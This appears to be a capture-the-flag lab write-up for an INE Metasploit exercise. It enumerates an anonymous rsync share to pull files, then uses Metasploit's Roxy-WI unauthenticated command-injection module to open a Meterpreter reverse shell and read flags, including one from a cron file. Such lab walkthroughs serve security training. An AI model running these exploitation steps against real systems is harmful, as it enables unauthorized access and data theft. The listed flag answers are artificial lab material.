#  Host & Network Penetration Testing: The Metasploit Framework CTF 2.


## Objective
Using various exploration techniques, complete the following tasks to capture the associated flags

## Skills Learned
- Use Metasploit and Nmap as the main tools to get the flags

## Tools Used

- Metasploit
- Nmap
- rsync

## Flags to Capture:
- Flag 1: Enumerate the open port using Metasploit, and inspect the RSYNC banner closely; it might reveal something interesting.
- Flag 2: The files on the RSYNC server hold valuable information. Explore the contents to find the flag.
- Flag 3: Try exploiting the webapp to gain a shell using Metasploit on target2.ine.local.
- Flag 4: Automated tasks can sometimes leave clues. Investigate scheduled jobs or running processes to uncover the hidden flag.

### Detailed Steps
<img width="1920" height="976" alt="Screenshot 2026-05-03 at 6 45 26 PM" src="https://github.com/user-attachments/assets/6b002db8-1979-418e-9540-c3ede09dccaa" />

First run the ```service postgresql start && msfconsole```  run the namp scan.

```
msf6 > db_nmap -sS -sV -O target1.ine.local
[*] Nmap: Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-04 05:08 IST
[*] Nmap: Nmap scan report for target1.ine.local (192.214.63.3)
[*] Nmap: Host is up (0.000058s latency).
[*] Nmap: Not shown: 999 closed tcp ports (reset)
[*] Nmap: PORT    STATE SERVICE VERSION
[*] Nmap: 873/tcp open  rsync   (protocol version 31)
[*] Nmap: MAC Address: 02:42:C0:D6:3F:03 (Unknown)
[*] Nmap: Device type: general purpose
[*] Nmap: Running: Linux 4.X|5.X
[*] Nmap: OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
[*] Nmap: OS details: Linux 4.15 - 5.8
[*] Nmap: Network Distance: 1 hop
[*] Nmap: OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 1.62 seconds
```
port 873 tcp is open and the service rsync is running. 
Connect to the rsync service.  To initiate a connection with an rsync server, use the rsync command followed by the rsync URL ```rsync rsync://user@target_host/```

```
┌──(root㉿INE)-[~]
└─# rsync rsync://target1.ine.local
backupwscohen   FLAG1_1f96171a565e45489b3e1c17173735cb
```
There's flag 1

Now the clue for the second is that we have to check the information within the server. For that, I'll pass the server info to the local machine. ``` rsync -av dir1/ dir2 ``` 

```
┌──(root㉿INE)-[~]
└─# rsync -av rsync://target1.ine.local/backupwscohen /root/Desktop
receiving incremental file list
./
TPSData.txt
office_staff.vhd
pii_data.xlsx

sent 84 bytes  received 341 bytes  850.00 bytes/sec
total size is 84  speedup is 0.20
```
Now locally position under Desktop nad list the directory

```
┌──(root㉿INE)-[~/Desktop]
└─# ls -l
total 28
-rw-r--r-- 1 root root  606 Jun 18  2024 'Copy-Paste README'
-rw-r--r-- 1 root root   25 Oct 28  2024  office_staff.vhd
lrwxrwxrwx 1 root root   55 Jun 26  2024  org.wireshark.Wireshark.desktop -> /usr/share/applications/org.wireshark.Wireshark.desktop
-rw-r--r-- 1 root root   39 May  4 05:04  pii_data.xlsx
-rw-r--r-- 1 root root  293 Jun 18  2024  README
drwxr-xr-x 1 root root 4096 Jul  3  2024  tools
-rw-r--r-- 1 root root   20 Oct 28  2024  TPSData.txt
drwxr-xr-x 1 root root 4096 Jun 26  2024  wordlists
```

Check the file pii_data.xlsx for the second flag 

```
┌──(root㉿INE)-[~/Desktop]                                                                                                                                                                 
└─# cat pii_data.xlsx                                                                                                                                                                                           
FLAG2_56a4a2d91cb94c0bb81616cf948c3680
```
For the third flag, let's use the second host and run the namp scan 

```
msf6 > db_nmap -sS -sV -sC -O target2.ine.local
[*] Nmap: Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-04 05:47 IST
[*] Nmap: Nmap scan report for target2.ine.local (192.214.63.4)
[*] Nmap: Host is up (0.000088s latency).
[*] Nmap: Not shown: 998 closed tcp ports (reset)
[*] Nmap: PORT    STATE SERVICE  VERSION
[*] Nmap: 80/tcp  open  http     Apache httpd 2.4.52 ((Ubuntu))
[*] Nmap: |_http-title: Roxy-WI
[*] Nmap: |_http-server-header: Apache/2.4.52 (Ubuntu)
[*] Nmap: 443/tcp open  ssl/http Apache httpd 2.4.52
[*] Nmap: |_ssl-date: TLS randomness does not represent time
[*] Nmap: | ssl-cert: Subject: commonName=*.roxy-wi.org/organizationName=Roxy-WI/stateOrProvinceName=Almaty/countryName=US
[*] Nmap: | Not valid before: 2022-07-29T05:20:44
[*] Nmap: |_Not valid after:  2050-12-14T05:20:44
[*] Nmap: | tls-alpn:
[*] Nmap: |_  http/1.1
[*] Nmap: |_http-server-header: Apache/2.4.52 (Ubuntu)
[*] Nmap: |_http-title: Roxy-WI
[*] Nmap: MAC Address: 02:42:C0:D6:3F:04 (Unknown)
[*] Nmap: Device type: general purpose
[*] Nmap: Running: Linux 4.X|5.X
[*] Nmap: OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
[*] Nmap: OS details: Linux 4.15 - 5.8
[*] Nmap: Network Distance: 1 hop
[*] Nmap: Service Info: Host: roxy-wi.example.com
[*] Nmap: OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 15.13 seconds

```

On port 80 and 443 there are websites running and the title is Roxy-WI, therefore, let's search for an exploit with the same name. 

```
msf6 > search roxy-wi

Matching Modules
================

   #  Name                             Disclosure Date  Rank       Check  Description
   -  ----                             ---------------  ----       -----  -----------
   0  exploit/linux/http/roxy_wi_exec  2022-07-06       excellent  Yes    Roxy-WI Prior to 6.1.1.0 Unauthenticated Command Injection RCE
   1    \_ target: Unix (In-Memory)    .                .          .      .
   2    \_ target: Linux (Dropper)     .                .          .      .

```

Now let's change the parameters in the exploit 

```
msf6 exploit(linux/http/roxy_wi_exec) > set RHOSTS target2.ine.local
RHOSTS => target2.ine.local
msf6 exploit(linux/http/roxy_wi_exec) > set SRVHOST eth1
SRVHOST => 192.214.63.2
msf6 exploit(linux/http/roxy_wi_exec) > set LHOST eth1
LHOST => 192.214.63.2
msf6 exploit(linux/http/roxy_wi_exec) > set LPORT 1234
LPORT => 1234
msf6 exploit(linux/http/roxy_wi_exec) > run
```
A meterpreter session is created, and the flag can be obtained 

```
meterpreter > cat /flag.txt
FLAG3_762517ae9674412889bbb3b80faa38ab
```

For the latest flag, we have to take a look to the running processes or scheduled jobs. We need to check cron jobs

```
meterpreter > ls -l /etc/cron.d
Listing: /etc/cron.d
====================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  201   fil   2022-01-09 01:32:36 +0530  e2scrub_all
100644/rw-r--r--  65    fil   2026-05-04 05:04:28 +0530  www-data-cron

```
Now cat the files in order to find the flag

```
meterpreter > cat /etc/cron.d/www-data-cron
* * * * * www-data echo "FLAG4_a14416a27bae4f7fb178025db8e4f4fd"

```
Wwe have finished the lab!

### Final Flags

<img width="1920" height="976" alt="Screenshot 2026-05-03 at 7 45 33 PM" src="https://github.com/user-attachments/assets/685a387a-8b71-4470-beac-84691b613166" />

- Flag 1: 1f96171a565e45489b3e1c17173735cb
- Flag 2: 56a4a2d91cb94c0bb81616cf948c3680
- Flag 3: 762517ae9674412889bbb3b80faa38ab
- Flag 4: a14416a27bae4f7fb178025db8e4f4fd
